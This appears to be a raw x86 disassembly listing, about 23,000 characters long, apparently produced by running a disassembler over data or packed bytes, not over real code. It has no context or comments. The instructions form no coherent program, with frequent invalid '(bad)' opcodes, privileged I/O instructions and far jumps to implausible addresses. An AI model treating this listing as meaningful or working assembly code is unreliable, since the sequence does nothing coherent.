  415b4b:	rcr    BYTE PTR ds:0xbb4e4a2a,1
  415b51:	xchg   DWORD PTR [esi-0x4d],esi
  415b54:	stos   BYTE PTR es:[edi],al
  415b55:	xchg   esp,eax
  415b56:	(bad)  
  415b58:	mov    ds:0xc9a58f8a,al
  415b5d:	sub    eax,0xc80c5f5
  415b62:	retf   
  415b63:	cli    
  415b64:	div    DWORD PTR [ecx+0x2b]
  415b67:	jno    0x415b38
  415b69:	sub    dl,ah
  415b6b:	and    bl,BYTE PTR [ebx-0x2]
  415b6e:	(bad)  [ecx+eax*4+0x34179ccb]
  415b75:	adc    BYTE PTR [esp+esi*2-0x100a17a3],0xd
  415b7d:	sti    
  415b7e:	add    BYTE PTR [ebx-0x5e],bl
  415b81:	ja     0x415bef
  415b83:	push   es
  415b84:	(bad)  
  415b85:	(bad)  
  415b86:	fstp   TBYTE PTR [ecx+0x67]
  415b89:	enter  0x344d,0x59
  415b8d:	rcr    DWORD PTR es:[edi+0x13],1
  415b91:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  415b93:	mov    fs,edi
  415b95:	mov    ds:0x2e50a6fd,eax
  415b9a:	sub    ah,dl
  415b9c:	xchg   ebx,eax
  415b9d:	mov    esp,0x87d16a05
  415ba2:	jmp    0x210d9002
  415ba7:	and    ebp,DWORD PTR [esp+ebx*8+0x39e02a25]
  415bae:	scas   al,BYTE PTR es:[edi]
  415baf:	lods   eax,DWORD PTR ds:[esi]
  415bb0:	adc    DWORD PTR [eax+0x1a],esi
  415bb3:	mov    ebx,0xd2ef7e82
  415bb8:	hlt    
  415bb9:	sbb    DWORD PTR [ebx],ebx
  415bbb:	cld    
  415bbc:	fdiv   DWORD PTR [ebx+edi*8+0x1a]
  415bc0:	mov    ?,WORD PTR [ebp+0x3]
  415bc3:	(bad)  
  415bc4:	adc    al,BYTE PTR [eax+eax*2]
  415bc7:	sbb    al,0x6b
  415bc9:	xchg   edi,eax
  415bca:	aam    0x23
  415bcc:	out    dx,al
  415bcd:	sahf   
  415bce:	rcr    DWORD PTR [eax-0x7b],1
  415bd1:	jne    0x415bbc
  415bd3:	int    0x27
  415bd5:	pushf  
  415bd6:	jnp    0x415c10
  415bd8:	(bad)  [eax]
  415bda:	iret   
  415bdb:	fs mov bl,0xaf
  415bde:	daa    
  415bdf:	and    DWORD PTR [edx+0x6995688f],eax
  415be5:	lock inc edx
  415be7:	jne    0x415c32
  415be9:	js     0x415bf7
  415beb:	jge    0x415bc0
  415bed:	xchg   edx,eax
  415bee:	adc    al,0x41
  415bf0:	ja     0x415bcd
  415bf2:	fsubr  QWORD PTR [eax+0xdb5f23b]
  415bf8:	adc    bh,0xee
  415bfb:	adc    dl,dl
  415bfd:	ret    0x953c
  415c00:	ins    DWORD PTR es:[edi],dx
  415c01:	or     al,0xb
  415c03:	mov    al,0x30
  415c05:	leave  
  415c06:	xlat   BYTE PTR ds:[ebx]
  415c07:	es pop edi
  415c09:	push   ebp
  415c0a:	aam    0xbd
  415c0c:	push   ebp
  415c0d:	or     edx,0xf49d42c1
  415c13:	and    cl,BYTE PTR [esi+edi*8-0x379c6ae6]
  415c1a:	xchg   ecx,eax
  415c1b:	push   eax
  415c1c:	add    eax,0xc9684dee
  415c21:	ret    
  415c22:	jbe    0x415baa
  415c24:	jle    0x415c48
  415c26:	inc    ebx
  415c27:	sub    DWORD PTR [ebp-0x9e9a3ce],ebp
  415c2d:	or     bh,BYTE PTR [eax+0x24578e70]
  415c33:	popf   
  415c34:	pop    ebp
  415c35:	dec    ebx
  415c36:	inc    esi
  415c37:	pop    esi
  415c38:	cli    
  415c39:	jne    0x415c11
  415c3b:	ins    BYTE PTR es:[edi],dx
  415c3c:	in     eax,0xec
  415c3e:	adc    edi,edx
  415c40:	fsub   DWORD PTR [edx-0x41]
  415c43:	hlt    
  415c44:	add    al,0xcd
  415c46:	adc    edi,DWORD PTR [edi+esi*4-0x7d]
  415c4a:	add    eax,0x5d81fa59
  415c4f:	clc    
  415c50:	fsub   DWORD PTR [ecx]
  415c52:	ins    DWORD PTR es:[edi],dx
  415c53:	jmp    0xdc3f60ce
  415c58:	je     0x415c3a
  415c5a:	shl    ecx,1
  415c5c:	lock xchg ebp,eax
  415c5e:	sti    
  415c5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c60:	xor    eax,0x6c17acff
  415c65:	push   ss
  415c66:	adc    eax,0x56dd57c4
  415c6b:	and    cl,ch
  415c6d:	outs   dx,DWORD PTR ds:[esi]
  415c6e:	fwait
  415c6f:	in     eax,0x46
  415c71:	mov    ds:0x338853d7,al
  415c76:	mov    ch,0xe5
  415c78:	sbb    bl,BYTE PTR [ebp-0x50]
  415c7b:	cli    
  415c7c:	je     0x415c10
  415c7e:	cdq    
  415c7f:	lods   al,BYTE PTR ds:[esi]
  415c80:	inc    esi
  415c81:	cs pop esp
  415c83:	pop    esi
  415c84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c85:	ret    0xb79d
  415c88:	lds    eax,FWORD PTR [edx+0x4e]
  415c8b:	test   ch,cl
  415c8d:	fs fwait
  415c8f:	gs sbb eax,0x7612eb37
  415c95:	and    dh,ah
  415c97:	cmp    bl,BYTE PTR [edx-0x86488bc]
  415c9d:	outs   dx,BYTE PTR ds:[esi]
  415c9e:	mov    ebx,0x3d3e367e
  415ca3:	pop    esp
  415ca4:	mov    eax,ds:0xc7b3d4a
  415ca9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415caa:	cli    
  415cab:	inc    esp
  415cac:	mov    bl,BYTE PTR [ecx]
  415cae:	push   cs
  415caf:	mov    dh,0x43
  415cb1:	cmp    esp,0x79bc01f7
  415cb7:	push   0x3b
  415cb9:	sub    eax,0xab5ecac
  415cbe:	pop    ss
  415cbf:	ficom  DWORD PTR [eax+ebx*2]
  415cc2:	inc    ebx
  415cc3:	retf   
  415cc4:	jns    0x415c8a
  415cc6:	jb     0x415d46
  415cc8:	adc    DWORD PTR [edx-0x68ea6e5d],ebx
  415cce:	push   ecx
  415ccf:	and    BYTE PTR [eax-0x4fc2ca62],dl
  415cd5:	xchg   ebx,eax
  415cd6:	xchg   al,dh
  415cd8:	scas   al,BYTE PTR es:[edi]
  415cd9:	or     edi,DWORD PTR [ebp+0xa8d5ae1]
  415cdf:	std    
  415ce0:	add    BYTE PTR [ecx-0x632b2bd2],dl
  415ce6:	sar    DWORD PTR [edx+0x58],cl
  415ce9:	pushf  
  415cea:	sub    BYTE PTR [ecx+ecx*2-0x52fbedf2],al
  415cf1:	call   0x7b71:0xf304c24e
  415cf8:	jg     0x415d77
  415cfa:	pop    ss
  415cfb:	iret   
  415cfc:	adc    ecx,DWORD PTR [ecx-0x52]
  415cff:	loop   0x415c85
  415d01:	sub    edi,DWORD PTR [edx+0x51ca83e7]
  415d07:	ja     0x415cc8
  415d09:	jmp    0xe0b6e5f7
  415d0e:	cwde   
  415d0f:	imul   esi,ebp,0x25
  415d12:	push   0x41
  415d14:	sub    edx,eax
  415d16:	in     al,dx
  415d17:	add    bl,dl
  415d19:	or     eax,0x90801863
  415d1e:	daa    
  415d1f:	imul   edi,esp,0xd0bf1fd5
  415d25:	mov    al,0xe5
  415d27:	dec    esp
  415d28:	fist   DWORD PTR [edi-0x69]
  415d2b:	int    0xb0
  415d2d:	out    dx,eax
  415d2e:	jbe    0x415daa
  415d30:	in     eax,0x0
  415d32:	jmp    0x6a30:0xb415e32
  415d39:	lahf   
  415d3a:	dec    ebx
  415d3b:	mov    ds:0xef88b13b,eax
  415d40:	(bad)  
  415d41:	loopne 0x415cc8
  415d43:	outs   dx,BYTE PTR ds:[esi]
  415d44:	rcl    BYTE PTR [eax-0x56f07093],cl
  415d4a:	inc    edx
  415d4b:	enter  0x920,0x47
  415d4f:	mov    eax,ds:0xfef59bdc
  415d54:	mov    eax,0x1d2a82f0
  415d59:	out    dx,al
  415d5a:	push   ebx
  415d5b:	xchg   esi,eax
  415d5c:	test   edi,esi
  415d5e:	adc    eax,0xb5dcf710
  415d63:	je     0x415cf2
  415d65:	fs xchg ebp,eax
  415d67:	xor    eax,DWORD PTR [esi]
  415d69:	fsubr  QWORD PTR [eax]
  415d6b:	or     al,0x35
  415d6d:	cmp    al,0x4f
  415d6f:	push   esp
  415d70:	mov    cl,0x53
  415d72:	sbb    BYTE PTR [esi],0xc5
  415d75:	or     al,0xce
  415d77:	fsub   QWORD PTR [ebp-0x6a31d7af]
  415d7d:	stos   BYTE PTR es:[edi],al
  415d7e:	adc    ah,dl
  415d80:	xchg   ecx,eax
  415d81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d82:	inc    ebx
  415d83:	mov    ch,0xd4
  415d85:	outs   dx,BYTE PTR ds:[esi]
  415d86:	push   ebx
  415d87:	out    0x47,al
  415d89:	iret   
  415d8a:	gs aam 0xfe
  415d8d:	out    dx,eax
  415d8e:	sub    ah,BYTE PTR [edi+0xe]
  415d91:	fsubr  QWORD PTR [esi+eax*1-0x4cfc2412]
  415d98:	and    eax,0xb9d29b22
  415d9d:	jbe    0x415d20
  415d9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415da0:	pop    ss
  415da1:	dec    edi
  415da2:	jbe    0x415e0e
  415da4:	pop    ecx
  415da5:	js     0x415db7
  415da7:	(bad)  
  415da9:	std    
  415daa:	xor    esi,esi
  415dac:	pop    es
  415dad:	inc    ebp
  415dae:	add    ebp,esp
  415db0:	loope  0x415dc5
  415db2:	div    BYTE PTR [ecx]
  415db4:	stos   DWORD PTR es:[edi],eax
  415db5:	aaa    
  415db6:	push   eax
  415db7:	xchg   ecx,eax
  415db8:	scas   eax,DWORD PTR es:[edi]
  415db9:	int3   
  415dba:	cmc    
  415dbb:	push   edi
  415dbc:	retf   
  415dbd:	lods   al,BYTE PTR ds:[esi]
  415dbe:	xchg   bl,bh
  415dc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dc1:	jne    0x415dd2
  415dc3:	idiv   DWORD PTR [edi+ebp*4+0x44be7c7c]
  415dca:	mov    al,ds:0x84127b03
  415dcf:	push   ecx
  415dd0:	push   ebx
  415dd1:	sbb    al,0x96
  415dd3:	div    DWORD PTR [eax+0x72290952]
  415dd9:	mov    bl,0xa8
  415ddb:	loop   0x415dbb
  415ddd:	sub    DWORD PTR [ecx-0x6c27a0ed],ebp
  415de3:	jmp    0x3927:0x3b8a3969
  415dea:	aam    0xeb
  415dec:	fwait
  415ded:	jno    0x415dc1
  415def:	gs in  eax,0xd9
  415df2:	and    eax,0xea3baf98
  415df7:	xlat   BYTE PTR ds:[ebx]
  415df8:	fwait
  415df9:	clc    
  415dfa:	fisub  DWORD PTR [ebx-0xc]
  415dfd:	loopne 0x415e76
  415dff:	cld    
  415e00:	repz pop ecx
  415e02:	aad    0x3c
  415e04:	push   edx
  415e05:	jne    0x415dcf
  415e07:	sbb    BYTE PTR [ebx],bl
  415e09:	mov    eax,0xf54b7598
  415e0e:	or     DWORD PTR [edi-0x71],esi
  415e11:	sub    DWORD PTR ds:0xe025f4bb,esi
  415e17:	add    eax,0x95aae1c3
  415e1c:	or     edx,esp
  415e1e:	push   cs
  415e1f:	das    
  415e20:	inc    ebx
  415e21:	aas    
  415e22:	(bad)  
  415e23:	sbb    eax,0xd55a183a
  415e28:	xlat   BYTE PTR ds:[ebx]
  415e29:	jmp    0x415e5f
  415e2b:	popa   
  415e2c:	push   ds
  415e2d:	jg     0x415e29
  415e2f:	mov    edx,0xe853c984
  415e34:	aad    0xff
  415e36:	cmc    
  415e37:	adc    DWORD PTR [edx+0x258e3a55],0x61ef9bb6
  415e41:	cli    
  415e42:	and    cl,ah
  415e44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e45:	mov    edi,0xf5cb77c8
  415e4a:	lods   eax,DWORD PTR ds:[esi]
  415e4b:	mov    al,0x22
  415e4d:	sahf   
  415e4e:	push   ds
  415e4f:	fld    TBYTE PTR [ebx+0x3418c358]
  415e55:	cmp    BYTE PTR [ebx-0x74],0xd5
  415e59:	xchg   ebx,eax
  415e5a:	lahf   
  415e5b:	das    
  415e5c:	dec    ebx
  415e5d:	jno    0x415e01
  415e5f:	sbb    al,0xb2
  415e61:	rcr    dh,0x1c
  415e64:	adc    DWORD PTR [edx+0x11],ebx
  415e67:	retf   
  415e68:	mov    bh,0xcc
  415e6a:	lock mov dh,0x3f
  415e6d:	ret    0xdc5c
  415e70:	retf   0x17bd
  415e73:	dec    ecx
  415e74:	and    BYTE PTR ds:0x1e2f16ed,0x34
  415e7b:	imul   edi,DWORD PTR [ebx+0x418617ba],0x95fad85f
  415e85:	mov    al,0x7b
  415e87:	dec    edx
  415e88:	mov    esi,0x9a265eec
  415e8d:	mov    ss,WORD PTR [ebx]
  415e8f:	ins    BYTE PTR es:[edi],dx
  415e90:	int    0x98
  415e92:	(bad)  
  415e93:	(bad)  
  415e94:	cmp    DWORD PTR [ebx-0x80],edi
  415e97:	mov    ebp,0xf1b8308
  415e9c:	cmp    eax,0xbe233c34
  415ea1:	push   edi
  415ea2:	mov    eax,0x3b1cca1d
  415ea7:	stos   DWORD PTR es:[edi],eax
  415ea8:	and    DWORD PTR [eax],edi
  415eaa:	fwait
  415eab:	push   esp
  415eac:	ja     0x415e96
  415eae:	xchg   BYTE PTR [ebx+eiz*2+0x1027b8c1],ch
  415eb5:	cmp    edx,DWORD PTR [ecx-0x2c]
  415eb8:	inc    esi
  415eb9:	out    0xf0,eax
  415ebb:	cli    
  415ebc:	in     eax,dx
  415ebd:	ins    BYTE PTR es:[edi],dx
  415ebe:	mov    bl,0x10
  415ec0:	add    dh,al
  415ec2:	sbb    ebp,ebp
  415ec4:	retf   
  415ec5:	test   BYTE PTR ds:0xd49ce996,dl
  415ecb:	pop    ss
  415ecc:	stc    
  415ecd:	pop    esp
  415ece:	popf   
  415ecf:	jmp    FWORD PTR [edi]
  415ed1:	xlat   BYTE PTR ds:[ebx]
  415ed2:	gs xchg esi,eax
  415ed4:	pop    ebp
  415ed5:	fcmovu st,st(1)
  415ed7:	sbb    al,0x8b
  415ed9:	inc    edx
  415eda:	vmread DWORD PTR [eax+esi*8-0x5c81cbe6],ebx
  415ee2:	in     al,dx
  415ee3:	jle    0x415ed8
  415ee5:	pop    eax
  415ee6:	jo     0x415f55
  415ee8:	and    DWORD PTR [edx+0x23],ebx
  415eeb:	outs   dx,BYTE PTR ds:[esi]
  415eec:	sub    eax,0x367eecbe
  415ef1:	mov    esi,0xfa78995b
  415ef6:	icebp  
  415ef7:	xchg   ebx,ecx
  415ef9:	cmp    ebx,DWORD PTR ds:0xa8707579
  415eff:	jg     0x415f5b
  415f01:	xor    ecx,DWORD PTR [ecx+0x5f]
  415f04:	or     ah,BYTE PTR [eax+0x4d]
  415f07:	mov    DWORD PTR [eax-0x69],ebx
  415f0a:	cmp    ah,BYTE PTR [edx+edi*8-0x21]
  415f0e:	test   BYTE PTR [esi+0x1d1897de],dh
  415f14:	neg    DWORD PTR [edx+edi*1+0x225a2ea0]
  415f1b:	in     eax,dx
  415f1c:	imul   BYTE PTR [edi-0x34]
  415f1f:	sub    ch,BYTE PTR [edi-0x1d189af2]
  415f25:	into   
  415f26:	sbb    eax,eax
  415f28:	cmp    BYTE PTR [edi+0x45],bh
  415f2b:	cs mov ah,0x1
  415f2e:	(bad)  
  415f2f:	cwde   
  415f30:	and    eax,0xb6f9cfeb
  415f35:	push   eax
  415f36:	mov    bh,0xd9
  415f38:	inc    ecx
  415f39:	ja     0x415ed6
  415f3b:	cmp    al,0xe0
  415f3d:	daa    
  415f3e:	lods   eax,DWORD PTR ds:[esi]
  415f3f:	xchg   BYTE PTR [ebx-0x56],ch
  415f42:	lods   al,BYTE PTR ds:[esi]
  415f43:	inc    edi
  415f44:	out    dx,eax
  415f45:	mov    ah,0x7b
  415f47:	mov    esi,DWORD PTR [edi-0x60]
  415f4a:	mov    ch,0x16
  415f4c:	test   DWORD PTR [ecx-0x64],0xb7c68e22
  415f53:	add    bh,bh
  415f55:	or     ecx,ebp
  415f57:	jo     0x415f74
  415f59:	mov    ah,0x7c
  415f5b:	push   0xffffffa5
  415f5d:	inc    esp
  415f5e:	repnz pusha 
  415f60:	push   edx
  415f61:	and    bh,BYTE PTR [esi-0x1e]
  415f64:	xor    cl,BYTE PTR [esi+ebp*2]
  415f67:	fisttp DWORD PTR [edi+eiz*1+0x67997ba2]
  415f6e:	rep ins DWORD PTR es:[edi],dx
  415f70:	out    0xdf,eax
  415f72:	add    bh,bl
  415f74:	jnp    0x415f02
  415f76:	cs std 
  415f78:	fnsave [edx+eiz*1]
  415f7b:	test   eax,0x3559af9e
  415f80:	shl    BYTE PTR [ecx-0x3d],1
  415f83:	xchg   ebx,eax
  415f84:	dec    eax
  415f85:	sti    
  415f86:	mov    eax,ds:0x4144466d
  415f8b:	jge    0x415fcc
  415f8d:	std    
  415f8e:	jp     0x415f51
  415f90:	ret    0xd9b8
  415f93:	and    eax,0xb1e6b2c
  415f98:	mov    al,0xec
  415f9a:	sbb    al,0x3e
  415f9c:	add    dl,BYTE PTR [edx-0x6c]
  415f9f:	aas    
  415fa0:	daa    
  415fa1:	jge    0x415fd8
  415fa3:	push   ebx
  415fa4:	dec    eax
  415fa5:	pop    es
  415fa6:	xchg   BYTE PTR [esi+0x1c],bh
  415fa9:	sbb    cl,ah
  415fab:	cmp    al,0x4b
  415fad:	push   esi
  415fae:	pusha  
  415faf:	imul   edx,eax,0xffffffc2
  415fb2:	mov    esp,0xe0d367a4
  415fb7:	retf   0xa4d1
  415fba:	pop    ebp
  415fbb:	in     al,dx
  415fbc:	pop    edx
  415fbd:	pop    ss
  415fbe:	enter  0xaaee,0xdf
  415fc2:	leave  
  415fc3:	cmp    ebx,DWORD PTR [eax-0x10]
  415fc6:	inc    edi
  415fc7:	(bad)  
  415fc8:	sub    eax,0xb12dc898
  415fcd:	and    BYTE PTR [edi+0x10],bh
  415fd0:	fidivr DWORD PTR [edx-0x4f8dc0fe]
  415fd6:	mov    eax,ecx
  415fd8:	repnz sbb al,0x1
  415fdb:	mov    edx,0xdac678d8
  415fe0:	adc    esi,eax
  415fe2:	jmp    0x70d8dfc1
  415fe7:	mov    ebp,0x79040450
  415fec:	push   edi
  415fed:	push   edx
  415fee:	out    dx,eax
  415fef:	fcmovbe st,st(5)
  415ff1:	xor    ecx,DWORD PTR [ecx+0x72]
  415ff4:	fstcw  WORD PTR [ebp+0x6fc7d130]
  415ffb:	outs   dx,BYTE PTR ds:[esi]
  415ffc:	or     eax,0xd5f17541
  416001:	add    ch,al
  416003:	jae    0x416037
  416005:	xchg   edi,eax
  416006:	leave  
  416007:	xlat   BYTE PTR ds:[ebx]
  416008:	outs   dx,DWORD PTR ds:[esi]
  416009:	inc    ebx
  41600a:	les    eax,FWORD PTR ss:[edx]
  41600d:	mov    esp,es
  41600f:	mov    esi,0xba8b2afa
  416014:	sub    dl,BYTE PTR [ecx-0x6536a380]
  41601a:	jae    0x415fd1
  41601c:	mov    esp,ebx
  41601e:	into   
  41601f:	add    ch,BYTE PTR [ecx]
  416021:	xchg   esi,eax
  416022:	inc    edx
  416023:	push   ebx
  416024:	jmp    0x415fe4
  416026:	mov    ebp,0xc32626e8
  41602b:	lahf   
  41602c:	arpl   WORD PTR [edx+0x28],bx
  41602f:	inc    ebp
  416030:	pop    ds
  416031:	stc    
  416032:	test   DWORD PTR [ebx-0x4cc7db76],esi
  416038:	add    DWORD PTR [ebx-0x3ce1c532],ebx
  41603e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41603f:	shr    DWORD PTR [ebp+0x140244c1],1
  416045:	mov    edx,0x418917af
  41604a:	jne    0x416027
  41604c:	jg     0x416008
  41604e:	cld    
  41604f:	inc    ecx
  416050:	push   0x32604bc1
  416055:	lock int3 
  416057:	jae    0x415fe6
  416059:	daa    
  41605a:	add    DWORD PTR [edx-0x19f632eb],ecx
  416060:	shr    BYTE PTR [ecx],1
  416062:	ret    
  416063:	pop    edi
  416064:	or     DWORD PTR [eax+0x3b],esp
  416067:	loop   0x416059
  416069:	test   DWORD PTR [edx],eax
  41606b:	inc    ecx
  41606c:	xchg   edx,eax
  41606d:	call   0xf05d:0xd099476e
  416074:	in     al,0x3e
  416076:	jb     0x416053
  416078:	fcmovb st,st(6)
  41607a:	sbb    DWORD PTR [ebp+0x62],esi
  41607d:	pop    ss
  41607e:	adc    eax,0x595efde5
  416083:	jge    0x41605f
  416085:	(bad)  
  416086:	fstp   TBYTE PTR [esi-0x794191c4]
  41608c:	sub    eax,0x203bfbba
  416091:	mov    ds:0x3b9fc645,al
  416096:	sbb    eax,0x6af7a691
  41609b:	mov    al,0x80
  41609d:	cmp    al,dh
  41609f:	cmp    al,0x28
  4160a1:	mov    esi,0xf7caa6de
  4160a6:	push   ds
  4160a7:	mov    ch,cl
  4160a9:	or     BYTE PTR [esp+0x7ba67e0e],0xc3
  4160b1:	in     eax,dx
  4160b2:	mov    dl,0xb4
  4160b4:	js     0x416077
  4160b6:	mov    al,ds:0xeec182f6
  4160bb:	and    DWORD PTR [ecx-0x1ec1e7ad],esi
  4160c1:	push   esp
  4160c2:	inc    ebp
  4160c3:	push   ebp
  4160c4:	cmp    ah,dh
  4160c6:	mov    ds:0xcc77c13a,al
  4160cb:	js     0x4160ad
  4160cd:	sub    ebp,DWORD PTR [eax+0x5e]
  4160d0:	dec    ecx
  4160d1:	sbb    esi,DWORD PTR [ecx]
  4160d3:	cwde   
  4160d4:	push   0xfffffff4
  4160d6:	add    eax,0xdf614a0c
  4160db:	cdq    
  4160dc:	cwde   
  4160dd:	sub    DWORD PTR [ebx+0x225300a2],ebp
  4160e3:	pop    esi
  4160e4:	test   DWORD PTR [ebx],ebp
  4160e6:	pop    es
  4160e7:	in     al,0x72
  4160e9:	repnz or DWORD PTR [edx],edx
  4160ec:	and    ch,BYTE PTR [edx+0x3c884a62]
  4160f2:	stos   BYTE PTR es:[edi],al
  4160f3:	pop    esi
  4160f4:	stc    
  4160f5:	in     al,0x55
  4160f7:	jb     0x416108
  4160f9:	popa   
  4160fa:	adc    eax,DWORD PTR [eax+edi*4]
  4160fd:	sbb    eax,0xc619db61
  416102:	repnz aad 0x56
  416105:	stos   BYTE PTR es:[edi],al
  416106:	push   ss
  416107:	je     0x4160f8
  416109:	fbld   TBYTE PTR [eax+ebx*4+0x378e2457]
  416110:	pop    esp
  416111:	mov    ah,BYTE PTR [edi-0x13]
  416114:	scas   al,BYTE PTR es:[edi]
  416115:	dec    eax
  416116:	inc    eax
  416117:	xor    dl,BYTE PTR [edi-0x21ef883c]
  41611d:	ret    
  41611e:	xor    ebp,eax
  416120:	loop   0x416167
  416122:	fild   QWORD PTR ds:0x28bbab5a
  416128:	jg     0x4160fd
  41612a:	(bad)  [esi]
  41612c:	inc    ebp
  41612d:	ins    BYTE PTR es:[edi],dx
  41612e:	aad    0x6e
  416130:	das    
  416131:	std    
  416132:	mov    ch,0x8
  416134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416135:	push   edi
  416136:	xchg   ebp,eax
  416137:	mov    edx,ebx
  416139:	cmp    al,0x2b
  41613b:	(bad)  
  41613c:	dec    edx
  41613d:	repz add eax,0x506b4753
  416143:	pop    esp
  416144:	imul   eax,DWORD PTR [edx],0xffffff88
  416147:	les    esi,FWORD PTR [esi-0x75]
  41614a:	test   eax,0x5ca12f14
  41614f:	or     al,0x10
  416151:	xor    dh,BYTE PTR [edi]
  416153:	inc    edi
  416154:	cmp    eax,0xf878f56c
  416159:	ficom  DWORD PTR [eax+ebp*8]
  41615c:	and    BYTE PTR [ebx],cl
  41615e:	jnp    0x4160ee
  416160:	fisubr DWORD PTR gs:[ebp+0x43]
  416164:	add    cl,BYTE PTR [eax+ebp*2+0x61]
  416168:	shr    BYTE PTR [eax+0x6a],0x4c
  41616c:	pop    es
  41616d:	jecxz  0x416144
  41616f:	jae    0x416143
  416171:	loope  0x4160f4
  416173:	ins    BYTE PTR es:[edi],dx
  416174:	popa   
  416175:	in     al,0xd6
  416177:	sti    
  416178:	ret    
  416179:	xlat   BYTE PTR ds:[ebx]
  41617a:	or     dh,BYTE PTR [esi-0x6597c4ba]
  416180:	jae    0x416142
  416182:	dec    edx
  416183:	icebp  
  416184:	in     al,0xfc
  416186:	pop    edi
  416187:	aaa    
  416188:	xor    eax,0x89d8838
  41618d:	cmp    al,BYTE PTR [esi+0x554eac5e]
  416193:	pop    ebp
  416194:	dec    edx
  416195:	sub    eax,0x3584e243
  41619a:	dec    edi
  41619b:	nop
  41619c:	add    BYTE PTR [ecx-0x6fa6cea],0x9d
  4161a3:	sub    ah,bl
  4161a5:	or     cl,BYTE PTR ds:0xc5e80914
  4161ab:	push   ebp
  4161ac:	jno    0x41614c
  4161ae:	mov    ch,0xa3
  4161b0:	dec    ebx
  4161b1:	test   al,0x32
  4161b3:	mov    esi,0x4017f07
  4161b8:	outs   dx,DWORD PTR ds:[esi]
  4161b9:	fmulp  st(2),st
  4161bb:	ds push es
  4161bd:	out    dx,al
  4161be:	fucomip st,st(0)
  4161c0:	push   edi
  4161c1:	fld    DWORD PTR [ecx]
  4161c3:	or     esi,DWORD PTR [esi+eiz*1-0x1f]
  4161c7:	push   es
  4161c8:	mov    ecx,0x39292c52
  4161cd:	add    al,0x4e
  4161cf:	fisub  DWORD PTR [esi]
  4161d1:	push   edx
  4161d2:	dec    eax
  4161d3:	pop    ebp
  4161d4:	jno    0x416162
  4161d6:	sbb    BYTE PTR [ebx+0x65bfe5c3],al
  4161dc:	mov    DWORD PTR [edi+edi*1+0x3e],0xba6fba7c
  4161e4:	js     0x41623b
  4161e6:	(bad)  
  4161e7:	pusha  
  4161e8:	ja     0x416254
  4161ea:	in     eax,dx
  4161eb:	dec    edi
  4161ec:	jl     0x41624c
  4161ee:	int3   
  4161ef:	(bad)  
  4161f0:	shl    DWORD PTR ds:0x1c3868c4,cl
  4161f6:	dec    ebp
  4161f7:	retf   
  4161f8:	(bad)  
  4161f9:	dec    esi
  4161fa:	ret    0xe488
  4161fd:	push   ebp
  4161fe:	sub    eax,0x33aa2bc6
  416203:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416204:	nop
  416205:	inc    eax
  416206:	jle    0x4161f2
  416208:	sbb    BYTE PTR [edx+0x449bcdc4],al
  41620e:	cmp    al,0xfc
  416210:	push   edi
  416211:	fist   DWORD PTR [ebx]
  416213:	cwde   
  416214:	dec    ebx
  416215:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416216:	into   
  416217:	jg     0x416293
  416219:	cmp    BYTE PTR [ecx+0x631a6783],ch
  41621f:	lahf   
  416220:	cmc    
  416221:	fwait
  416222:	js     0x416249
  416224:	push   0xf0d24e0d
  416229:	cmp    edi,ebx
  41622b:	dec    eax
  41622c:	jl     0x4162a9
  41622e:	lods   al,BYTE PTR ds:[esi]
  41622f:	imul   esi,DWORD PTR [edi],0x27
  416232:	inc    ebx
  416233:	inc    eax
  416234:	mov    ah,0xdc
  416236:	fs aas 
  416238:	(bad)  
  416239:	jecxz  0x41625f
  41623b:	das    
  41623c:	std    
  41623d:	popf   
  41623e:	or     al,0x2e
  416240:	add    DWORD PTR [edi],edx
  416242:	adc    BYTE PTR [ebx-0x10247b80],0x5
  416249:	pop    eax
  41624a:	enter  0xf6f2,0xb4
  41624e:	loop   0x416268
  416250:	iret   
  416251:	pop    ds
  416252:	imul   eax,DWORD PTR [ebx+esi*1+0x6bbb05c0],0xffffffa8
  41625a:	dec    esi
  41625b:	jmp    FWORD PTR [ebx+0x40a342e4]
  416261:	sar    al,0x9e
  416264:	inc    esp
  416265:	xor    BYTE PTR [esi+0x10],dl
  416268:	imul   ebx,ecx,0x4b
  41626b:	xlat   BYTE PTR ds:[ebx]
  41626c:	lds    eax,FWORD PTR [edx]
  41626e:	gs xor al,0xe2
  416271:	push   ebx
  416272:	std    
  416273:	jo     0x41624a
  416275:	sbb    al,0xa0
  416277:	pop    edi
  416278:	mov    edx,0x9bcb8cc9
  41627d:	icebp  
  41627e:	in     eax,dx
  41627f:	xor    bl,BYTE PTR [ecx-0x2b]
  416282:	xlat   BYTE PTR ds:[ebx]
  416283:	inc    edx
  416284:	or     al,0x97
  416286:	test   eax,0x209ddd13
  41628b:	cwde   
  41628c:	jmp    0x67bf9d87
  416291:	fst    st(7)
  416293:	pop    ecx
  416294:	mov    ds:0x229eff48,eax
  416299:	(bad)  
  41629a:	and    BYTE PTR [edi],al
  41629c:	add    BYTE PTR [ebp+0x53],0xaf
  4162a0:	rcl    DWORD PTR [ebx-0x33d99af7],cl
  4162a6:	mov    ds:0xc0cb643a,al
  4162ab:	cmp    dl,BYTE PTR [ecx]
  4162ad:	jae    0x41629d
  4162af:	in     al,dx
  4162b0:	add    al,0xc4
  4162b2:	add    BYTE PTR [ebp+0x80eefed],0x5
  4162b9:	test   eax,0x3d01cdaa
  4162be:	mov    ch,0x4d
  4162c0:	mov    eax,0x6d91562e
  4162c5:	or     bl,BYTE PTR ds:0x2943ff0d
  4162cb:	xchg   ebp,eax
  4162cc:	jle    0x416267
  4162ce:	fst    st(3)
  4162d0:	inc    ebp
  4162d1:	stos   BYTE PTR es:[edi],al
  4162d2:	je     0x4162e0
  4162d4:	imul   ecx,DWORD PTR ds:0xe6dbb18f,0xffffff9e
  4162db:	ror    DWORD PTR [ebx-0x68d31d48],1
  4162e1:	cld    
  4162e2:	mov    esi,DWORD PTR [edx-0x46c8d1ab]
  4162e8:	jne    0x41627e
  4162ea:	xor    edi,DWORD PTR [ebp+0x33]
  4162ed:	popa   
  4162ee:	adc    cl,bh
